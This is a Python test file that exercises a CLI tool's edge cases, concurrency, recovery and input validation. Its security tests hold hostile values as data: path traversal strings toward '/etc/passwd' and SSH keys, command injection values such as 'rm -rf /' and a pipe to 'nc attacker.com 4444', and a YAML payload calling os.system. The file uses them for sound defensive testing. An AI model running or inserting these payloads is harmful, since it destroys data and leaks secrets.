"""Comprehensive edge case testing for CLI commands.

This test suite covers unusual edge cases, boundary conditions, and stress
testing scenarios that could occur in real-world usage but are not covered
by normal functional tests.
"""

import pytest
import tempfile
import os
import shutil
import yaml
import json
import signal
import threading
import time
import sys
from pathlib import Path
from click.testing import CliRunner
from unittest.mock import patch, MagicMock

from beginnings.cli.main import cli
from beginnings.cli.utils.errors import CLIError, ProjectError, ConfigurationError


class TestCLIBoundaryConditions:
    """Test CLI behavior at boundary conditions."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_maximum_file_path_length(self):
        """Test CLI handles maximum file path lengths."""
        # Create very long directory structure
        long_path = self.temp_dir
        for i in range(20):  # Create deep directory structure
            long_path = os.path.join(long_path, f"very_long_directory_name_{i}")
        
        try:
            os.makedirs(long_path, exist_ok=True)
            
            result = self.runner.invoke(cli, [
                "new", "test-project",
                "--output-dir", long_path,
                "--no-git", "--no-deps"
            ])
            
            # Should handle long paths or fail gracefully
            if result.exit_code != 0:
                assert "path" in result.output.lower() or "length" in result.output.lower()
            
        except OSError:
            # Path too long for filesystem - this is expected
            pytest.skip("Filesystem doesn't support long paths")
    
    def test_zero_disk_space_simulation(self):
        """Test CLI behavior when disk space is exhausted."""
        with patch('builtins.open', side_effect=OSError(28, "No space left on device")):
            result = self.runner.invoke(cli, [
                "new", "space-test",
                "--output-dir", self.temp_dir,
                "--no-git", "--no-deps"
            ])
            
            assert result.exit_code != 0
            assert "space" in result.output.lower() or "disk" in result.output.lower()
    
    def test_maximum_configuration_file_size(self):
        """Test CLI handles extremely large configuration files."""
        # Create very large configuration file
        large_config = os.path.join(self.temp_dir, "huge.yaml")
        
        with open(large_config, "w") as f:
            f.write("app:\n  name: huge-test\n")
            f.write("massive_data:\n")
            
            # Write 100K lines of configuration
            for i in range(100000):
                f.write(f"  key_{i}: 'value_{i}_with_some_longer_content_to_make_it_bigger'\n")
        
        # Test validation on large file
        result = self.runner.invoke(cli, [
            "config", "validate",
            "--config", large_config
        ])
        
        # Should handle large files without crashing
        assert result.exit_code == 0 or result.exit_code == 1
        # Should not consume excessive memory or time
    
    def test_empty_or_minimal_inputs(self):
        """Test CLI behavior with empty or minimal inputs."""
        # Empty project name
        result = self.runner.invoke(cli, [
            "new", "",
            "--output-dir", self.temp_dir
        ])
        
        assert result.exit_code != 0
        assert "project name" in result.output.lower()
        
        # Single character project name
        result = self.runner.invoke(cli, [
            "new", "a",
            "--output-dir", self.temp_dir,
            "--no-git", "--no-deps"
        ])
        
        # Should work for valid single character names
        assert result.exit_code == 0
        assert os.path.exists(os.path.join(self.temp_dir, "a"))
    
    def test_maximum_command_line_arguments(self):
        """Test CLI with maximum number of command line arguments."""
        # Test with many verbose flags (should be idempotent)
        result = self.runner.invoke(cli, [
            "--verbose", "--verbose", "--verbose",
            "--quiet", "--quiet",  # Conflicting options
            "config", "show"
        ])
        
        # Should handle conflicting or repeated options gracefully
        assert result.exit_code == 0 or result.exit_code == 1
    
    def test_unicode_and_special_characters_everywhere(self):
        """Test CLI handles unicode in all possible places."""
        # Unicode in configuration values
        config_with_unicode = {
            "app": {
                "name": "测试应用",  # Chinese characters
                "description": "Приложение тест",  # Cyrillic
                "emoji": "🚀🎉✨"  # Emojis
            }
        }
        
        config_file = os.path.join(self.temp_dir, "unicode.yaml")
        with open(config_file, "w", encoding="utf-8") as f:
            yaml.dump(config_with_unicode, f, allow_unicode=True)
        
        result = self.runner.invoke(cli, [
            "config", "validate",
            "--config", config_file
        ])
        
        # Should handle unicode configuration gracefully
        assert result.exit_code == 0 or result.exit_code == 1
    
    def test_extremely_nested_configuration(self):
        """Test CLI with extremely nested configuration structures."""
        # Create deeply nested configuration
        nested_config = {"app": {"name": "nested-test"}}
        current = nested_config
        
        # Create 50 levels of nesting
        for i in range(50):
            current[f"level_{i}"] = {}
            current = current[f"level_{i}"]
        
        current["deep_value"] = "reached the bottom"
        
        config_file = os.path.join(self.temp_dir, "nested.yaml")
        with open(config_file, "w") as f:
            yaml.dump(nested_config, f)
        
        result = self.runner.invoke(cli, [
            "config", "show",
            "--config", config_file
        ])
        
        # Should handle deep nesting without stack overflow
        assert result.exit_code == 0
        assert "deep_value" in result.output or "reached the bottom" in result.output


class TestCLIConcurrencyAndRaceConditions:
    """Test CLI behavior under concurrent access and race conditions."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_concurrent_project_creation(self):
        """Test concurrent project creation doesn't interfere."""
        results = []
        errors = []
        
        def create_project_thread(thread_id):
            try:
                runner = CliRunner()
                with patch('subprocess.run') as mock_subprocess:
                    mock_subprocess.return_value = None
                    
                    result = runner.invoke(cli, [
                        "new", f"concurrent-{thread_id}",
                        "--output-dir", self.temp_dir,
                        "--no-git", "--no-deps"
                    ])
                    results.append((thread_id, result.exit_code))
            except Exception as e:
                errors.append((thread_id, str(e)))
        
        # Start 5 concurrent project creations
        threads = []
        for i in range(5):
            thread = threading.Thread(target=create_project_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join(timeout=30)  # 30 second timeout
        
        # All should complete without errors
        assert len(errors) == 0, f"Concurrent errors: {errors}"
        assert len(results) == 5
        
        # At least some should succeed
        successful = [r for r in results if r[1] == 0]
        assert len(successful) >= 1
    
    def test_concurrent_configuration_access(self):
        """Test concurrent configuration file access."""
        config_file = os.path.join(self.temp_dir, "concurrent.yaml")
        
        # Create initial config
        with open(config_file, "w") as f:
            yaml.dump({"app": {"name": "concurrent-test"}}, f)
        
        results = []
        
        def access_config_thread(thread_id):
            runner = CliRunner()
            
            # Mix of read and write operations
            if thread_id % 2 == 0:
                # Read operation
                result = runner.invoke(cli, [
                    "config", "show",
                    "--config", config_file
                ])
            else:
                # Validation operation
                result = runner.invoke(cli, [
                    "config", "validate",
                    "--config", config_file
                ])
            
            results.append((thread_id, result.exit_code))
        
        # Start 10 concurrent config operations
        threads = []
        for i in range(10):
            thread = threading.Thread(target=access_config_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=20)
        
        # Most operations should succeed
        assert len(results) == 10
        successful = [r for r in results if r[1] == 0]
        assert len(successful) >= 8  # Allow for some contention
    
    def test_signal_handling_during_operations(self):
        """Test CLI handles signals appropriately during long operations."""
        # This is tricky to test reliably, so we'll simulate it
        
        def interrupt_after_delay():
            time.sleep(0.1)  # Short delay
            os.kill(os.getpid(), signal.SIGINT)
        
        # Start interrupt timer
        interrupt_thread = threading.Thread(target=interrupt_after_delay)
        interrupt_thread.start()
        
        try:
            # Simulate long-running operation
            with patch('beginnings.cli.templates.engine.TemplateEngine.generate_project') as mock_generate:
                def slow_generate(*args, **kwargs):
                    time.sleep(0.5)  # Simulate slow operation
                    return None
                
                mock_generate.side_effect = slow_generate
                
                result = self.runner.invoke(cli, [
                    "new", "interrupt-test",
                    "--output-dir", self.temp_dir,
                    "--no-git", "--no-deps"
                ])
                
                # Should be interrupted gracefully
                assert result.exit_code != 0
                
        except KeyboardInterrupt:
            # Expected behavior
            pass
        
        interrupt_thread.join()
    
    def test_file_locking_behavior(self):
        """Test CLI behavior when files are locked by other processes."""
        config_file = os.path.join(self.temp_dir, "locked.yaml")
        
        # Create config file
        with open(config_file, "w") as f:
            yaml.dump({"app": {"name": "locked-test"}}, f)
        
        # Simulate file lock by keeping it open
        with open(config_file, "r") as locked_file:
            # Try to modify the file while it's "locked"
            result = self.runner.invoke(cli, [
                "config", "fix",
                "--config", config_file,
                "--dry-run"
            ])
            
            # Should handle gracefully (dry-run shouldn't need write access)
            assert result.exit_code == 0 or "lock" in result.output.lower()


class TestCLIErrorRecoveryAndResilience:
    """Test CLI error recovery and resilience mechanisms."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_recovery_from_corrupted_templates(self):
        """Test CLI recovers from corrupted template files."""
        # Mock corrupted template
        with patch('beginnings.cli.templates.engine.TemplateEngine.render_template') as mock_render:
            mock_render.side_effect = Exception("Template corruption error")
            
            result = self.runner.invoke(cli, [
                "new", "recovery-test",
                "--output-dir", self.temp_dir,
                "--no-git", "--no-deps"
            ])
            
            # Should fail gracefully with helpful error
            assert result.exit_code != 0
            assert "template" in result.output.lower() or "error" in result.output.lower()
    
    def test_recovery_from_permission_changes_mid_operation(self):
        """Test CLI recovery when permissions change during operation."""
        project_path = os.path.join(self.temp_dir, "permission-test")
        os.makedirs(project_path)
        
        def make_readonly_after_delay():
            time.sleep(0.1)
            try:
                os.chmod(project_path, 0o444)  # Make read-only
            except OSError:
                pass  # May already be in use
        
        # Start permission change in background
        permission_thread = threading.Thread(target=make_readonly_after_delay)
        permission_thread.start()
        
        try:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = None
                
                result = self.runner.invoke(cli, [
                    "new", "permission-test",
                    "--output-dir", self.temp_dir,
                    "--no-git", "--no-deps"
                ])
                
                # Should handle permission changes gracefully
                if result.exit_code != 0:
                    assert "permission" in result.output.lower()
        
        finally:
            # Restore permissions for cleanup
            try:
                os.chmod(project_path, 0o755)
            except OSError:
                pass
            
            permission_thread.join()
    
    def test_recovery_from_network_timeouts(self):
        """Test CLI recovery from network timeouts during dependency installation."""
        import socket
        
        def timeout_after_delay(*args, **kwargs):
            time.sleep(0.1)
            raise socket.timeout("Network timeout")
        
        with patch('subprocess.run', side_effect=timeout_after_delay):
            result = self.runner.invoke(cli, [
                "new", "timeout-test",
                "--output-dir", self.temp_dir,
                "--no-git"  # Don't skip dependencies to trigger network call
            ])
            
            # Should handle network timeout gracefully
            assert result.exit_code != 0
            assert "timeout" in result.output.lower() or "network" in result.output.lower()
    
    def test_recovery_from_incomplete_project_state(self):
        """Test CLI recovery from incomplete project states."""
        # Create partially created project
        project_name = "incomplete-test"
        project_path = os.path.join(self.temp_dir, project_name)
        
        # Create some but not all expected directories
        os.makedirs(os.path.join(project_path, "config"))
        
        # Try to run in incomplete project
        with patch('os.getcwd') as mock_cwd:
            mock_cwd.return_value = project_path
            
            result = self.runner.invoke(cli, ["run"])
            
            # Should detect incomplete project and provide helpful error
            assert result.exit_code != 0
            assert "project" in result.output.lower() or "incomplete" in result.output.lower()
    
    def test_graceful_degradation_missing_features(self):
        """Test CLI gracefully degrades when optional features are missing."""
        # Mock missing optional dependencies
        with patch('importlib.import_module') as mock_import:
            def selective_import_error(module_name):
                if 'optional' in module_name or 'fastapi' in module_name:
                    raise ImportError(f"No module named '{module_name}'")
                return MagicMock()
            
            mock_import.side_effect = selective_import_error
            
            # CLI should still provide basic functionality
            result = self.runner.invoke(cli, ["--help"])
            assert result.exit_code == 0
            
            # Debug dashboard might not work, but should fail gracefully
            result = self.runner.invoke(cli, ["debug", "--help"])
            # Should either work or provide helpful error about missing dependencies
            assert result.exit_code == 0 or "import" in result.output.lower()


class TestCLISecurityAndValidation:
    """Test CLI security validation and input sanitization."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_path_traversal_prevention(self):
        """Test CLI prevents path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "${HOME}/.bashrc"
        ]
        
        for malicious_path in malicious_paths:
            result = self.runner.invoke(cli, [
                "new", "test-project",
                "--output-dir", malicious_path,
                "--no-git", "--no-deps"
            ])
            
            # Should reject dangerous paths
            assert result.exit_code != 0 or not os.path.exists(malicious_path)
    
    def test_command_injection_prevention(self):
        """Test CLI prevents command injection in project names."""
        injection_attempts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "$(whoami)",
            "`id`",
            "test\nrm -rf /"
        ]
        
        for injection in injection_attempts:
            result = self.runner.invoke(cli, [
                "new", injection,
                "--output-dir", self.temp_dir,
                "--no-git", "--no-deps"
            ])
            
            # Should reject injection attempts
            assert result.exit_code != 0
            assert "invalid" in result.output.lower() or "project name" in result.output.lower()
    
    def test_configuration_injection_prevention(self):
        """Test CLI prevents YAML injection in configuration."""
        # Create config with potential YAML injection
        malicious_config = os.path.join(self.temp_dir, "malicious.yaml")
        
        with open(malicious_config, "w") as f:
            f.write("""
app:
  name: test
  # Attempt YAML injection
  evil: !!python/object/apply:os.system ['rm -rf /']
""")
        
        result = self.runner.invoke(cli, [
            "config", "validate",
            "--config", malicious_config
        ])
        
        # Should either reject malicious YAML or handle safely
        assert result.exit_code == 0 or result.exit_code == 1
        # Should not execute the malicious code
    
    def test_symlink_attack_prevention(self):
        """Test CLI prevents symlink attacks."""
        try:
            # Create symlink to sensitive location
            sensitive_target = "/etc"
            symlink_path = os.path.join(self.temp_dir, "evil_symlink")
            
            os.symlink(sensitive_target, symlink_path)
            
            result = self.runner.invoke(cli, [
                "new", "test-project",
                "--output-dir", symlink_path,
                "--no-git", "--no-deps"
            ])
            
            # Should handle symlinks safely
            # Either resolve them properly or reject them
            if result.exit_code == 0:
                # If it succeeded, verify it didn't create files in sensitive location
                assert not os.path.exists(os.path.join(sensitive_target, "test-project"))
            
        except OSError:
            # Symlinks not supported on this system
            pytest.skip("Symlinks not supported")
    
    def test_resource_exhaustion_prevention(self):
        """Test CLI prevents resource exhaustion attacks."""
        # Test with extremely large input values
        huge_value = "x" * 1000000  # 1MB string
        
        result = self.runner.invoke(cli, [
            "new", huge_value,
            "--output-dir", self.temp_dir
        ])
        
        # Should reject huge inputs that could cause resource exhaustion
        assert result.exit_code != 0
        assert "too long" in result.output.lower() or "invalid" in result.output.lower()


class TestCLICompatibilityAndPortability:
    """Test CLI compatibility across different environments."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up test fixtures."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_path_separator_handling(self):
        """Test CLI handles different path separators correctly."""
        # Test with different path styles
        path_styles = [
            os.path.join("nested", "directory"),  # OS-appropriate
            "nested/directory",  # Unix-style
        ]
        
        if os.name == 'nt':  # Windows
            path_styles.append("nested\\directory")  # Windows-style
        
        for path_style in path_styles:
            output_dir = os.path.join(self.temp_dir, path_style)
            os.makedirs(output_dir, exist_ok=True)
            
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = None
                
                result = self.runner.invoke(cli, [
                    "new", "path-test",
                    "--output-dir", output_dir,
                    "--no-git", "--no-deps"
                ])
                
                # Should handle path separators correctly
                assert result.exit_code == 0
                assert os.path.exists(os.path.join(output_dir, "path-test"))
    
    def test_file_encoding_handling(self):
        """Test CLI handles different file encodings."""
        # Create config files with different encodings
        encodings = ['utf-8', 'latin-1', 'ascii']
        
        for encoding in encodings:
            try:
                config_file = os.path.join(self.temp_dir, f"config_{encoding}.yaml")
                config_content = "app:\n  name: encoding-test\n"
                
                with open(config_file, "w", encoding=encoding) as f:
                    f.write(config_content)
                
                result = self.runner.invoke(cli, [
                    "config", "validate",
                    "--config", config_file
                ])
                
                # Should handle different encodings gracefully
                assert result.exit_code == 0 or result.exit_code == 1
                
            except UnicodeEncodeError:
                # Skip if content can't be encoded in this encoding
                continue
    
    def test_case_sensitivity_handling(self):
        """Test CLI handles case sensitivity appropriately."""
        # Test command case sensitivity
        result_lower = self.runner.invoke(cli, ["config", "--help"])
        result_mixed = self.runner.invoke(cli, ["CONFIG", "--help"])  # Should fail
        
        assert result_lower.exit_code == 0
        assert result_mixed.exit_code != 0  # Commands should be case-sensitive
        
        # Test file path case sensitivity (varies by OS)
        config_content = "app:\n  name: case-test\n"
        
        config_lower = os.path.join(self.temp_dir, "config.yaml")
        config_upper = os.path.join(self.temp_dir, "CONFIG.yaml")
        
        with open(config_lower, "w") as f:
            f.write(config_content)
        
        # Test accessing with different case
        result = self.runner.invoke(cli, [
            "config", "validate",
            "--config", config_upper
        ])
        
        # Result depends on filesystem case sensitivity
        # On case-insensitive systems (Windows, macOS default), should work
        # On case-sensitive systems (Linux), should fail
    
    def test_permission_model_compatibility(self):
        """Test CLI works with different permission models."""
        # Create files with different permissions
        config_file = os.path.join(self.temp_dir, "perms.yaml")
        
        with open(config_file, "w") as f:
            f.write("app:\n  name: perms-test\n")
        
        # Test with read-only file
        os.chmod(config_file, 0o444)
        
        result = self.runner.invoke(cli, [
            "config", "show",  # Read operation
            "--config", config_file
        ])
        
        # Should work for read operations
        assert result.exit_code == 0
        
        # Test write operation (should fail gracefully)
        result = self.runner.invoke(cli, [
            "config", "fix",
            "--config", config_file
        ])
        
        # Should detect permission issue
        if result.exit_code != 0:
            assert "permission" in result.output.lower()
        
        # Restore permissions for cleanup
        os.chmod(config_file, 0o644)